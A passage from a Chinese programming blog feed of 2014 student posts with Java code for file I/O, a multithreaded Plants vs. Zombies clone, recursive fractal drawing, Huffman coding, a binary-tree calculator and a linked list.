			FileInputStream fin=new FileInputStream(filename);
			//一个一个字节去读取文件中的值，此类不适用于汉字
			byte n=(byte)fin.read();
			//当n=-1时，代表已经读到末尾
			while(n!=-1){
				//进行输出
				//System.out.println(n);//此时读出的是每个字符的ASCLL码
				System.out.print((char)n);//此时读出的是原文档文字
				//继续接收
				n=(byte)fin.read();
			}
			//得到输入流的剩余字节数量
			int len = fin.available();
			byte[] bytes = new byte[len];
			//从输入流中读取数据到bytes
			int num = fin.read(bytes);
			
			//GB2312,GBK,UTF-8,ISO-8859-1....
			String content = new String(bytes, "GBK");
			System.out.println(content);
			//记住一定要关闭文件
			fin.close();
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		
	}
	
	//实现写的功能
	public void write(String filename){
		try {
			//将要写入的文件，命为filename，如若不存在，不报错，直接新建
			//所以这也相当于新建功能
			FileOutputStream fout=new FileOutputStream(filename,false);
			fout.write(232);
			String s="";
			byte[] bytes=s.getBytes("GBK");
			fout.write(bytes);					
			fout.close();
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}
	
	//实现复制粘贴的供能
	public void copy(String filename1,String filename2){
		
		try {
			FileInputStream  f1=new FileInputStream(filename1);
			FileOutputStream f2=new FileOutputStream(filename2);
			int n = f1.read();
			while(n != -1){
				//边读边写
				f2.write(n);
				
				n = f1.read();
			}
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		
		
	}
	public static void main(String[] args){
		File f=new File ();
		f.read("E:/文件1.txt");
		f.write("E:/write.txt");
		f.copy("E:/文件1.txt", "E:/文件2.txt");
	  //f.copy("E:/Kalimba.mp3", "E:/音乐.mp3");
	}
}
 在读入的时候，java中显示读入的内容是这样的：
 
 我们注意到，凡是注释的地方成为了乱码，这是由于文件读写的时候是一个字节一个字节读的，而汉字是双字节。
之后的复制，粘贴功能截图如下
： 复制后内容不变，如下：
 文件加密与解密就可以在如图n上动手脚，例如，n+1，你知道在解密的时候，需要n-1，或者你可以用更复杂的式子，发挥你的数学特长，什么傅里叶，伯努利，泰勒式子都可以往上摆，加强你的加密强度，只有你自己知道如何解密，这就是加密解密的初步思想，当然，这样的界面是不好看的，之后你可以自己设计一个JFrame界面，更加人性化实现文件功能，不止读写，copy，你可以随意添加你想要的功能，也可以设计一个小
word
 
 
 
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
多线程植物大战僵尸源代码, 429899791.iteye.com.blog.2064185, Fri, 09 May 2014 10:07:41 +0800

                          这是上一篇多线程实现植物大战僵尸博客文章的源代码，部分改进，添加攻击，生产阳光等功能
详情请看上一篇代码。
后续改进中，代码会继续在这里上传
    本文附件下载:
    
      植物大战僵尸.rar (8.7 MB)
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
分形递归画图案图片DIY, 429899791.iteye.com.blog.2059000, Wed, 30 Apr 2014 19:31:00 +0800

                                    递归，用最少的代码量完成最大的工作量，初步对递归开始上心是因为机试老师给了一道题，看到后开始着急忙慌就开始做，最后那个代码量，就不忍吐槽了，自己还觉得挺自豪的，写了那么多行代码，也打印出了正确图形，，结果老师一公布他的答案，和我几百行的代码相比老师只用了7行，完败。。。。。。。。。
于是觉得与其拿到题就开始做不如先找规律，本来思想就比代码重要，分形就是用递归画出美丽的图案，那些平时在我们眼中单调无趣的线条以及点，就能在不断递归中画出自然界之美。
我随意挑了两个比较有代表性的图案
画出的图如下所示：
   
 
以下是代码实现：
import java.awt.BorderLayout;
import java.awt.Color;
import java.awt.FlowLayout;
import java.awt.Graphics;
import java.util.Random;
import javax.swing.ImageIcon;
import javax.swing.JFrame;
import javax.swing.JLabel;
public class Main extends JFrame {
	 
    private Color color;
    double a,b,c,d;  
    
    double x1=0;  
    double y1=0;  
    double x2,y2;  
    public static void main(String[] args) {
             // TODO Auto-generated method stub
             Main a = new Main();
             a.draw();
 }
   
     public void draw(){//绘制界面，建立画布
         this.setSize(1000,800);//
         this.setLocationRelativeTo(null);
         this.setDefaultCloseOperation(3);
         this.setLayout(new FlowLayout());
         //设置可见
         this.setVisible(true);
        
         Graphics g = this.getGraphics();
         //调用·手镯图形
         this.magic(g);
     }
     //手镯图形，公式已经得知
     public void magic(Graphics g){
    	double a = 1.40,b = 1.56,c = 1.40, d = -6.56;   
         for(int i=0;i<12133;i++){  
             for(int t=0;t<80;t++){  
                 Color co = new Color(t++,t*2,t*3);  
                 g.setColor(co); }  
          
             double x2=d*Math.sin(a*x1)-Math.sin(b*y1);  
             double y2=c*Math.cos(a*x1)+Math.cos(b*y1);  
             int x22= (int) (x2*30)+300;  
             int y22=(int) (y2*30)+200;  
             System.out.println(x22+","+y22);  
             g.drawLine(x22,y22,x22,y22);  
             x1=x2;  
             y1=y2;}  
     }
     
     public void paint(Graphics g){
                      super.paint(g);
                      this.magic2(500,550,100, Math.PI/2,0,Math.PI/6,25,g);
                      //(Math.PI为180°)
     }
     
     public void magic2(double x0,double y0,double l,double a,double b,double c,double count,Graphics g){
    	ImageIcon cat=new ImageIcon("image//$R7U8UGI.gif");
 		ImageIcon dog=new ImageIcon("image//$RJT225K.gif");
 		ImageIcon panda=new ImageIcon("image//$RM069VP.gif");
 		
 
         double x2;
         double y2;
         double x3;
         double y3;
         double x4;
         double y4;
         double x5;
         double y5;
         Random r=new Random();
         //颜色随机变化
         color = new Color(r.nextInt(256),r.nextInt(256),r.nextInt(256));
         g.setColor(color);
         if(count<1)
         {
                  return;
         }//判断是否继续进行递归调用，注意：判断一定要放在递归调用之前，否则这段代码将永远不会被执行
   x2 = x0 - l*Math.cos(a);
   y2 = y0 - l*Math.sin(a);
   x3 = x2 - l*Math.cos(b);
   y3 = y2 - l*Math.sin(b);
   x4 = x0 - l*Math.cos(b);
   y4 = y0 - l*Math.sin(b);
   x5 = x2 - l*Math.cos(Math.PI/6)*Math.cos(c);
   y5 = y2 - l*Math.cos(Math.PI/6)*Math.sin(c);
//可画图形，计算五个点的位置，以右下点为（X0，Y0）
   //g.drawImage(cat.getImage(),(int)x0-300,(int)y0-300, null);
   //g.drawImage(panda.getImage(),(int)x2-300,(int)y2+300, null);
   //g.drawImage(dog.getImage(),(int)x3,(int)y3, null);
   //g.drawImage(cat.getImage(),(int)x4,(int)y4, null);
   //g.drawImage(panda.getImage(),(int)x5,(int)y5, null);
   g.drawLine((int)x0, (int)y0, (int)x2, (int)y2);
   g.drawLine((int)x2, (int)y2, (int)x3, (int)y3);
   g.drawLine((int)x3, (int)y3, (int)x4, (int)y4);
   g.drawLine((int)x4, (int)y4, (int)x0, (int)y0);
   g.drawLine((int)x2, (int)y2, (int)x5, (int)y5);
   g.drawLine((int)x5, (int)y5, (int)x3, (int)y3);
//递归调用
         magic2(x2,y2,l*Math.cos(Math.PI/6),a+Math.PI/6,b+Math.PI/6,c+Math.PI/6,count-1,g);
         magic2(x5,y5,l*Math.sin(Math.PI/6),a-Math.PI/3,b-Math.PI/3,c-Math.PI/3,count-1,g);
     }
     private Color getColor(int inc){
 		int red = color.getRed();
 		int green = color.getGreen();
 		int blue = color.getBlue();
 		red += inc;
 		green += inc;
 		blue += inc;
 		
 		if(red > 255)
 			red = 255;
 		if(green > 255)
 			green = 255;
 		if(blue > 255)
 			blue = 255;
 		return new Color(red,green,blue);
 	}
        
     }
 
 
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
多线程实现植物大战僵尸, 429899791.iteye.com.blog.2055712, Sat, 26 Apr 2014 21:41:39 +0800

        我们在之前学的编程语言中，所有代码的执行顺序是串行的，也就是按顺序执行，这样就造成了一个问题，也许当你刚刚接触编程语言时候无关大碍，甚至在达到一定水平之后可以自己设计五子棋，贪食蛇，连连看等游戏，但是看着自己设计的界面以及游戏，有没有感觉缺少什么？对了，就是单调，不够动态，因为串行语句必须等上面的代码执行完了才会执行下面的语句，这样就无法支持同步性，当时造成我主要困扰的是想要完成儿童时代的经典游戏   坦克大战  时，忽然考虑到了一个很大的问题
          用单线程实现不出来！！！！！因为子弹是一个线程，坦克是一个线程，敌人的坦克又是一个线程，当时有种崩溃的感觉，因为还不知道有多线程这个东西
因此再学了多线程以后（多线程是并行语句），立马就像做出目前脍炙人口的游戏
         植物大战僵尸
 
简单部署界面，用到了缓冲图，实现不断刷新的功能
还加上了声音，以及判断阳光点击获取
一下是关键代码：
import java.awt.BorderLayout;
import java.awt.Dimension;
import java.awt.FlowLayout;
import java.awt.Graphics;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.MouseEvent;
import java.awt.event.MouseListener;
import java.awt.event.MouseMotionListener;
import java.awt.Color;
import java.awt.event.MouseAdapter;
import java.awt.image.BufferedImage;
import java.net.URL;
import javax.swing.ImageIcon;
import javax.swing.JButton;
import javax.swing.JFrame;
import javax.swing.JLabel;
import javax.swing.JPanel;
public class main extends JFrame {
	private ImageIcon background;
	private JFrame jf;
	private JPanel imagePanel;
	private Game game;
	 static int x=0,y=0;
	 private Graphics g;
	public static void main(String args[]){
		//new main().initUi2();
		new main().initUi1();
	}
	public void initUi1(){
		JFrame jf=new JFrame();
	    background = new ImageIcon("image//menu.png");//
	    JLabel label = new JLabel(background);//
	    ImageIcon login=new ImageIcon("image//start_leave.png");
		JButton jlogin=new JButton(login);
		this.game=new Game();
	
		jlogin.setPreferredSize(new Dimension(login.getIconWidth(),login.getIconHeight()));
		
		ActionListener a=new ActionListener(){
			@Override
			public void actionPerformed(ActionEvent e) {
				
				game.initUI();
				
			}
			
		};
		
		label.setBounds(0,0,background.getIconWidth(),background.getIconHeight());
		
		imagePanel = (JPanel)this.getContentPane();
		imagePanel.setOpaque(false);
		
		imagePanel.setLayout(new FlowLayout());
		imagePanel.add(jlogin);
		
		this.getLayeredPane().setLayout(null);
		
	    this.getLayeredPane().add(label,new Integer(Integer.MIN_VALUE));
	  
		this.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
		this.setSize(background.getIconWidth(),background.getIconHeight());
		this.setLayout(new BorderLayout());
		jlogin.addActionListener(a);
		this.add(jlogin,BorderLayout.SOUTH);
		this.setVisible(true);
		
	}
 接下来是游戏界面  代码如下：
import java.awt.Color;
import sun.audio.*;
import java.applet.Applet;
import java.applet.AudioClip;
import java.io.*;
import java.net.MalformedURLException;
import java.net.URL;
import java.awt.BorderLayout;
import java.awt.Dimension;
import java.awt.FlowLayout;
import java.awt.Graphics;
import java.awt.List;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.MouseAdapter;
import java.awt.event.MouseEvent;
import java.awt.event.MouseMotionListener;
import java.awt.image.BufferedImage;
import java.util.ArrayList;
import javax.swing.ImageIcon;
import javax.swing.JButton;
import javax.swing.JFrame;
import javax.swing.JLabel;
import javax.swing.JPanel;
public class  Game{
	private JFrame jf;
	
	private int [] a=new int[100];
	private ArrayList<Ball> list=new ArrayList<Ball>();
	public void initUI(){
	    jf = new JFrame();
		jf.setSize(1600, 620);
		jf.setDefaultCloseOperation(3);
		AudioClip clip = null;
		try {
			clip = Applet.newAudioClip((new File("image/网1.wav")).toURI().toURL());
		} catch (MalformedURLException e1) {
			// TODO Auto-generated catch block
			e1.printStackTrace();
		}
		clip.play();
		
	
		jf.setLayout(new FlowLayout());
		
		    ImageIcon p1=new ImageIcon("image//single_bullet_plant.png");
		    ImageIcon p2=new ImageIcon("image//2.png");
		    ImageIcon p3=new ImageIcon("image//3.png");
		    ImageIcon p4=new ImageIcon("image//4.png");
		    ImageIcon p5=new ImageIcon("image//5.png");
		    ImageIcon p6=new ImageIcon("image//6.png");
		    ImageIcon p7=new ImageIcon("image//7.png");
		   
		    
		    JButton start=new JButton("开始战斗");
			start.setLocation(500,600);
			start.setBounds(500, 500, 600, 600);
			
			
			jf.setLayout(new FlowLayout());
			jf.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
			
			
			jf.add(start);
		
		    jf.setVisible(true);
		    
		  
		
		while(true){
			try {
				Thread.sleep(10);
			} catch (InterruptedException e) {
				e.printStackTrace();
			}
			draw(jf.getGraphics());
		}
	
	}
	
	
	ImageIcon bjIcon = new ImageIcon("image/background1.jpg");
	ImageIcon personIcon = new ImageIcon("image/person.gif");
	ImageIcon p1=new ImageIcon("image//1.png");
	ImageIcon p11=new ImageIcon("image//11.jpg");
	ImageIcon p2=new ImageIcon("image//2.png");
	ImageIcon p22=new ImageIcon("image//sun.gif");
	ImageIcon p3=new ImageIcon("image//3.png");
	ImageIcon p4=new ImageIcon("image//4.png");
	ImageIcon p44=new ImageIcon("image//u9.jpg");
	ImageIcon p5=new ImageIcon("image//5.png");
	ImageIcon p6=new ImageIcon("image//6.png");
	ImageIcon p66=new ImageIcon("image//111.jpg");
	ImageIcon p7=new ImageIcon("image//7.png");
	ImageIcon p77=new ImageIcon("image//u5.jpg");
	ImageIcon chanzi1=new ImageIcon("image//shovel_bk.png");
	ImageIcon chanzi=new ImageIcon("image//shovel.png");
	ImageIcon a1=new ImageIcon("image//u1.jpg");
	ImageIcon a2=new ImageIcon("image//u2.jpg");
	ImageIcon a3=new ImageIcon("image//u3.jpg");
	ImageIcon a5=new ImageIcon("image//u5.jpg");
	ImageIcon a6=new ImageIcon("image//u6.jpg");
	ImageIcon a7=new ImageIcon("image//u7.jpg");
	ImageIcon a8=new ImageIcon("image//u8.jpg");
	ImageIcon a9=new ImageIcon("image//u9.jpg");
	ImageIcon a10=new ImageIcon("image//u10.jpg");
	ImageIcon a11=new ImageIcon("image//u11.jpg");
	ImageIcon a12=new ImageIcon("image//u12.jpg");
	ImageIcon a13=new ImageIcon("image//u13.jpg");
	ImageIcon a14=new ImageIcon("image//uwogua.jpg");
	int x=0,y=0;
	int lx,ly;
	int lxx,lyy;
	int px,py;
	BufferedImage buffer = new BufferedImage(
			1600,
			620,
			BufferedImage.TYPE_INT_RGB);
	public void draw(Graphics g){
		
		Graphics gg = buffer.getGraphics();
		
		gg.setColor(Color.BLACK);
		gg.fillRect(0, 0, jf.getWidth(), jf.getHeight());
		gg.drawImage(bjIcon.getImage(), x, y, null);
		gg.drawImage(bjIcon.getImage(), x+bjIcon.getIconWidth(), y, null);
		//画随机植物
		gg.drawImage(a1.getImage(), 400, 350, null);
		
		gg.drawImage(p11.getImage(), 250, 280, null);
		Wandou w=new Wandou();
		if(true){
		w.draw(gg,290,280);
		try {
			w.sleep(3);
		} catch (InterruptedException e1) {
			// TODO Auto-generated catch block
			e1.printStackTrace();
		}
		//w.draw(gg,280,280);
		}
		//画阳光值增加
		gg.setColor(Color.BLACK);
		
		if(true){
			new Sun().draw(gg,jf);
		}
		//gg.setColor(Color.RED);
		//gg.drawString("50", 100, 100);
		gg.drawImage(a2.getImage(), 500, 150, null);
		
		gg.drawImage(a3.getImage(), 600, 200, null);
		gg.drawImage(a6.getImage(), 700, 200, null);
		gg.drawImage(a5.getImage(), 480, 330, null);
		gg.drawImage(a7.getImage(), 1000, 400, null);
		gg.drawImage(a8.getImage(), 800, 200, null);
		gg.drawImage(a14.getImage(), 250, 150, null);
		//gg.drawImage(a13.getImage(), 1000, 200, null);//画一个普通僵尸
		Zombie z1=new Zombie();
		if(true){
			try {
				z1.sleep(50);
			} catch (InterruptedException e1) {
				// TODO Auto-generated catch block
				e1.printStackTrace();
			}
			z1.draw(gg,1000,200);
			}
		
		gg.drawImage(a12.getImage(), 320, 70, null);
		//画阳光值增加
		g.drawString("50", 80, 30);
		//画可以挑选植物
		gg.drawImage(p1.getImage(), 400, 20, null);
		gg.drawImage(p2.getImage(),460, 20, null);
		gg.drawImage(p3.getImage(), 520, 20, null);
		gg.drawImage(p4.getImage(), 580, 20, null);
		gg.drawImage(p5.getImage(), 640, 20, null);
		gg.drawImage(p6.getImage(), 700, 20, null);
		gg.drawImage(p7.getImage(), 760, 20, null);
		gg.drawImage(chanzi1.getImage(), 1000, 500, null);
		//gg.drawImage(personIcon.getImage(), 1200, 300, null);
		  jf.addMouseListener(new MouseAdapter(){
		  	   public void mousePressed(MouseEvent e){
//		  		   
		  		   System.out.println("32");
		  		    lx=e.getX();ly=e.getY();
		  		   }
		  		  });
		  jf.addMouseMotionListener(new MouseAdapter(){
	 			
				public void mouseDragged(MouseEvent e) {
					  lxx=e.getX();lyy=e.getY();
				}
				public void mouseReleased(MouseEvent e) {
					  px=e.getX();
					  py=e.getY();
				}
				
				public void mouseMoved(MouseEvent e) {
					// TODO Auto-generated method stub
					
				}
		    	
		    });
		
	    if(lx<=460&&lx>=400){
	    	  
		   
		 		
		 gg.drawImage(p11.getImage(), lxx,lyy, null);
		 gg.drawImage(p11.getImage(), a[0],a[1], null);
		
	     }
	    
		//if(lx<=460&&lx>=400){
			//new Plant().draw(jf, gg);
		//}
		
	    if(lx<=520&&lx>=460){
	    	
	    	 
			 gg.drawImage(p22.getImage(), lxx,lyy, null);
			 gg.drawImage(p22.getImage(), a[1],a[2], null);
			
		     }
	    // if(lx<=520&&lx>=460){
	    	// new Plant().draw(jf, gg);
			
		    // }
	     if(lx<=580&&lx>=520){
			 gg.drawImage(p3.getImage(), lxx,lyy, null);
			// gg.drawImage(p3.getImage(), px,py, null);
			
		     }
	     if(lx<=640&&lx>=580){
			 gg.drawImage(p44.getImage(), lxx,lyy, null);
			
		     }
	     if(lx<=700&&lx>=640){
			 gg.drawImage(p5.getImage(), lxx,lyy, null);
			
		     }
	     if(lx<=760&&lx>=700){
			 gg.drawImage(p66.getImage(), lxx,lyy, null);
			
		     }
	     if(lx<=820&&lx>=760){
			 gg.drawImage(p77.getImage(), lxx,lyy, null);
			
		     }
	     if(lx<=1200&&lx>=820){
			 gg.drawImage(chanzi.getImage(), lxx,lyy, null);
			
		     }
	     
	     
		
		
		//x-=5;
		//if(x+bjIcon.getIconWidth() <= 0){
			//x = 0;
		//}
		
		
		
		
		
		for(int i=0; i<list.size(); i++){
			Ball ball = list.get(i);
			ball.draw(gg);
		}
		
		
		g.drawImage(buffer, 0, 0, null);
	}
	
	ActionListener l = new ActionListener() {
		public void actionPerformed(ActionEvent e) {
			String cmd = e.getActionCommand();
			if("start".equals(cmd)){
				Ball t = new Ball(jf, list);
				t.start();
				
				list.add(t);
			}
			if("pause".equals(cmd)){
				for(int i=0; i<list.size(); i++){
					Ball ball = list.get(i);
//					ball.suspend();
					ball.setPause(true);
				}
			}
			if("resume".equals(cmd)){
				for(int i=0; i<list.size(); i++){
					Ball ball = list.get(i);
//					ball.resume();
					ball.setPause(false);
				}
			}
			if("stop".equals(cmd)){
				while(!list.isEmpty()){
					Ball ball = list.remove(0);
					ball.setStop(true);
				}
			}
		}
	};
	
	
	public static void main(String[] args) {
	   new Game().initUI();
	
		
	}
	
}
 阳光：
 
 
 
import java.awt.Color;
import java.awt.Graphics;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.MouseAdapter;
import java.awt.event.MouseEvent;
import java.util.Random;
import javax.swing.ImageIcon;
import javax.swing.JFrame;
public class Sun extends Thread{
	public Random r=new Random();
	private int x=800,y=30;
	private static int vx,vy;
	private static int i=50;
	public void draw(final Graphics g,JFrame jf){
		
		final ImageIcon sun=new ImageIcon("image/sun.png");
		final ImageIcon sunback=new ImageIcon("image/SunBank.png");
		g.drawImage(sun.getImage(),x,y+vy,null);
		g.drawImage(sunback.getImage(),220,30,null);
		vy+=1;
		g.setColor(Color.RED);
		g.drawString(i+"", 250, 110);
		 jf.addMouseListener(new MouseAdapter(){
		  	   public void mousePressed(MouseEvent e){
		  		  
		  		    if(Math.abs(e.getX()-x)<=100&&Math.abs(y+vy-e.getY())<=100){
		  		    	if(x>250&&y>0){
		  		    		 System.out.println("32");
		  		    	
		  				g.drawImage(sun.getImage(),220,30,null);
		  				vy-=100;
		  				vx-=100;
		  		    	}
		  				i+=50;
		  		    	
		  		    }
		  		   }
		  		  });
		
			
		
		if(y+vy>600){
			vy=5;
			g.drawImage(sun.getImage(),x,y+vy,null);
			vy+=1;
		}
	
	
	}
}
 
豌豆攻击线程代码：
import java.awt.Graphics;
import javax.swing.ImageIcon;
public class Wandou extends Thread{
	private int  wx=280,wy=280;
	private static int vx=5;
	public void draw(Graphics g,int wx,int wy){
		
		//System.out.print("23232");
		ImageIcon wandou=new ImageIcon("image//bullet_01.png");
		g.drawImage(wandou.getImage(),wx+vx,wy,null);
		vx+=5;
		if(wx+vx>=800){
			vx=5;
			g.drawImage(wandou.getImage(),wx+vx,wy,null);
			vx+=5;
		}
		}
	
	
}
 僵尸前进代码：
import java.awt.Graphics;
import javax.swing.ImageIcon;
public class Zombie extends Thread{
	private int  zx=280,zy=280;
	private static int vx=5;
	public void draw(Graphics g,int zx,int zy){
		ImageIcon a8=new ImageIcon("image//u8.jpg");
		//System.out.print("23232");
		ImageIcon a13=new ImageIcon("image//u13.jpg");
		g.drawImage(a13.getImage(),zx-vx,zy,null);
		vx+=1;
		//if(zx-vx<=800){
		//	vx=5;
		//	g.drawImage(a8.getImage(),800-vx,200,null);
		//	vx+=1;
		//}
		}
}
 之后就是计算算法，执行攻击功能的预判了
已有 4 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
哈夫曼编码, 429899791.iteye.com.blog.2035155, Sun, 23 Mar 2014 19:11:22 +0800

       
 
 
      哈夫曼编码(Huffman Coding)是一种编码方式，哈夫曼编码是可变字长编码(VLC)的一种。Huffman于1952年提出一种编码方法，该方法完全依据字符出现概率来构造异字头的平均长 度最短的码字，有时称之为最佳编码，一般就叫作Huffman编码。
              以下是代码实现：
public class HFM { class Node{  Node left;  Node right;  String code="";  int data; } public void creatTree(int [] datas){  Node [] nodes=new Node[datas.length]; // 新建一个长度为传入数组长度的Node类型  //遍历将传入数组的值赋给node数组，同时为每个node【i】开辟一个堆空间  for(int i=0;i<nodes.length;i++){   nodes[i]=new Node();   nodes[i].data=datas[i];  }  //当长度大于1时  while(nodes.length>1){   //只要当长度大于一时，开始排序   sort(nodes);   //赋值   Node n1 = nodes[0];   Node n2 = nodes[1];      Node node = new Node();   //左节点指向n1   node.left = n1;   //右节点指向n2   node.right = n2;   //得到相加的值   node.data = n1.data +n2.data;   //新建node型数组，比原节点少一个   Node[] nodes2 = new Node[nodes.length-1];   //将n1，n2，删除掉，将数组从nodes2【2】开始   for(int i = 2; i<nodes.length;i++){    nodes2[i-2]=nodes[i];   }   //将新建的数组地址赋给node   nodes2[nodes2.length-1]=node;   //更新数组   nodes = nodes2;   }   //根节点指向更新后数组首地址   Node root = nodes[0];   //打印树   printTree(root,"");  }          public void printTree(Node node ,String code){     if(node!=null){   //先序遍历   if(node.left==null&&node.right==null)//有了条件只打印叶结点   System.out.println(node.data+"的编码是："+code);   printTree(node.left,code+"0");   printTree(node.right,code+"1");  }         }
 public void sort(Node[] nodes){  //冒泡法排序  for(int i = 0;i<nodes.length;i++){   for(int j = i;j<nodes.length;j++){    if(nodes[i].data>nodes[j].data){     Node temp = new Node();     temp=nodes[i];     nodes[i]=nodes[j];     nodes[j]=temp;    }       }  }   } public static void main(String[] args) {  // TODO Auto-generated method stub  HFM hfm = new HFM();    int[] datas = {3,2,7,4,0};    hfm.creatTree(datas); }}
效果如图所示：
 
 
 
已有 1 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
二叉树实现复杂运算, 429899791.iteye.com.blog.2035153, Sun, 23 Mar 2014 18:59:57 +0800

 
                                                  二叉树
        树是一种重要的非线性数据结构，直观地看，它是数据元素（在树中称为结点）按分支关系组织起来的结构，很象自然界中的树那样。树结构在客观世界中广泛存在，如人类社会的族谱和各种社会组织机构都可用树形象表示。树在计算机领域中也得到广泛应用，如在编译源程序如下时，可用树表示源源程序如下的语法结构。又如在数据库系统中，树型结构也是信息的重要组织形式之一。一切具有层次关系的问题都可用树来描述。满二叉树，完全二叉树，排序二叉树。
  利用二叉树，我们可以实现计算器的复杂运算，一下代码仅支持单数字运算，多位还需要添加判断语句。
package twotree;
public class Node {
	Node left;
	Node right;
	Node parent;
	int data;
	String str;
}
 以上是我们定义的的树左节点，右节点，父节点，数据，及符号接下来就是关键代码：
 
 
 
public class Tree {
	Node root;//定义根节点
	public void add(String str,int data){
		Node node=new Node();//创建一个新结点
		node.data=data;//接受加入数据
		node.str=str;//接受加入数据
		//判断如果根节点为空
		if(root==null){
			//第一个添加的节点为根
			root=node;
		}
		else{
			if(root.parent==null){
				//父节点为空，指向node
				root.parent=node;
				//将node的左节点插入到root上
				node.left=node;
				
			}
		
		else{
			//右节点为空，指向node
			root.parent.right=node;
			//将根节点指向父节点，将root节点向上移动一层
			root=root.parent;
		}
	}
	}
	public int cal(Node node){
		//如果节点不为空，右节点不为空
		if(node!=null&&node.right!=null){
			//判断运算符
			if(node.str.equals("-")){
				//调用递归函数
				return cal(node.left)-node.right.data;
			}
			if(node.str.equals("+")){
				//调用递归函数
				return cal(node.left)+node.right.data;
			}
		}
		else{
			//如果左节点为空，就返回当前元素
			if(node.left==null){
				return node.data;
			}
		}
		return 0;
	}
	
	//打印树
	public void printTree(){
		//定义节点指向根节点
		Node temp=root;
		//当节点不为空
		while(temp!=null){
			//打印节点所带的运算符和计算的数字
			System.out.print("str="+temp.str+",data="+temp.data);
			//父节点不为空时
			if(temp.parent != null){
				//父节点右子树不为空时
				if(temp.parent.right != null){
					System.out.print(" right:str="+temp.parent.right.str+",data="+temp.parent.right.data);
				}
			}
			System.out.println();
			temp=temp.left;//下移节点到左边
			
		}
	}
	public static void main(String args[]){
		//实例化一个树的对象
		Tree tree=new Tree();
		//定义复合运算
		String str="1+4-5-8+9-5";
		//得到每一个字符
		for(int i=0;i<str.length();i++){
			char c=str.charAt(i);
			if(c=='+'||c=='-'){
				tree.add(""+c, 0);
			}
			else{
				//将数字转化为字符型
				tree.add("", Integer.parseInt(""+c));
			}
		}
		//打印树
		tree.printTree();
		//输出计算结果
		System.out.println(tree.cal(tree.root));
	}
}
 出来结果如下： 
 
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
链表 插入删除添加, 429899791.iteye.com.blog.2034282, Thu, 20 Mar 2014 21:21:56 +0800

                                                         Java中的链表
              我在写关于java代码的过程中，总要引用C中的术语，并不是因为卖弄C中的学识，而是作为一种最为基础的语言，它的最先存在必定是有意义的，毕竟C++，C#，java都是以它为基础慢慢建立起来的，所以在链表这里我一如往常引用C中的指针来解释。首先插入一段代码：
public class Data {
	Data next;//定义节点,其实在这里节点的概念最难理解，我的理解是开辟一个对象空间一个框，用于指针（C术语）来获取到节点，来接受外来位置
    Object data;//定义元素
}
 这里的关键是next应用，它在C语言中是指针的应用，但是我们都知道Java中并没有指针，所以我们解释成引用，它用来保存当前节点的地址和指向下一个节点。Object data  由于无法知道将要插入元素的类型，所以定义为Object
一下的难点是插入实现，它涉及到前节点和后节点，图示会清楚一些：
 
 
public class Link { private Data root;//定义表头 private Data tail;//定义表尾 private int size;//定义长度 public static void main(String args[]){  Link link=new Link();  for(int i=0; i<10; i++){   link.add("str"+i);  } // System.out.println("删除的元素是："+link.remove(9));  //System.out.println("删除的元素是:"+link.remove(0));  link.insert(0,"a");  link.insert(2, "b");  for(int i=0; i<link.getsize(); i++){   System.out.println(link.get(i));  }  System.out.println("===========================");  //link.add("add");  for(int i=0; i<link.getsize(); i++){   System.out.println(link.get(i));  }
 } //定义将要添加到链表的元素 public void add(Object data){  Data node=new Data();//创建数据对象     node.data=data;//接受传入数据     //如果表头为0，也就是链表为空  if(root==null){   root=node;//将将要加入的节点位置赋给表头   tail=node;//同理，表尾的位置也是新加入元素位置  }  //如果链表不为空  else{   tail.next=node;//将链表尾部下一个位置指向node的地址   tail=node;//因为表尾永远指向表尾，所以将表尾指向node节点的位置  }   size++;//长度+1 } //查找指定位置的元素 public Object get(int index){  //判断越界情况  if(index<0||index>=size){   throw new java.lang.ArrayIndexOutOfBoundsException("超出队列范围！");
  }  //定义一个temp值来接受表头，具体作用下面代码诠释  Data temp=root;  //遍历不断指向下一个节点  for(int i=0;i<index;i++){   temp=temp.next;     }        return temp.data;   } public boolean insert(int index,Object a){  Data node=new Data();//创建数据对象     node.data=a;//接受传入数据  if(index < 0 || index >= size){   //抛出一个异常   throw new java.lang.ArrayIndexOutOfBoundsException("超出队列范围！");  }  //表头添加方法  if(index==0){   //将当前节点指针指向根节点，相当于插入，形象理解为鼠标插入电脑，next就是那根线   node.next=root;   //因为根节点总是指向表头，所以将根节点指向表头   root=node;   //长度+1   size++;    return true;  }  //定义一个节点来接受根节点  Data temp=root;  //遍历循环来查找将要插入元素的前一个节点  for(int i=0;i<index-1;i++){   //循环查找   temp=temp.next;  }  //定义一个节点来存储将要插入元素的下一个节点  Data temp1=temp.next;  //将插入元素的上一个节点指针指向当前节点，相当于连接  temp.next=node;  //将当前节点的指针指向将要插入元素位置的下一个节点  node.next=temp1;  //长度+1  size++;
